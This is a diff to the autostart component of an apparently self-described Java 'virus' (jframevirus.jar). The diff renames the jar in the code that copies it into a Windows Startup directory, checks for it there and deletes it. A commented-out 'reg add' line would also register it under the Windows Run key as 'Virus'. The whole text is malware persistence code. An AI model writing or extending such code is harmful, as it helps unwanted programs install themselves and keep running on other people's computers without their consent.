@@ -28,7 +28,7 @@ public class AutoStartManager {
                     // TODO: 5/15/22 Test this in windows
                     // Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Virus /t REG_SZ /d \"java -jar jframevirus.jar\"");
                     File file = new File("jframevirus.jar");
-                    FileUtils.copyFile(file, new File("C:\\Windows\\Startup\\jframevirus.jar"));
+                    FileUtils.copyFile(file, new File("C:\\Windows\\Startup\\JFrameVirus.jar"));
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -43,7 +43,7 @@ public class AutoStartManager {
     public void removeVirusFromStartup() {
         if (this.isVirusInStartup()) {
             if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-                new File("C:\\Windows\\Startup\\jframevirus.jar").delete();
+                new File("C:\\Windows\\Startup\\JFrameVirus.jar").delete();
             } else { // TODO: 5/15/22 Make this work on linux and mac
             }
         }
@@ -51,7 +51,7 @@ public class AutoStartManager {
 
     private boolean isVirusInStartup() {
         if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            return new File("C:\\Windows\\Startup\\jframevirus.jar").exists();
+            return new File("C:\\Windows\\Startup\\JFrameVirus.jar").exists();
         } else { // TODO: 5/15/22 Make this work on linux and mac
             return false;
         }
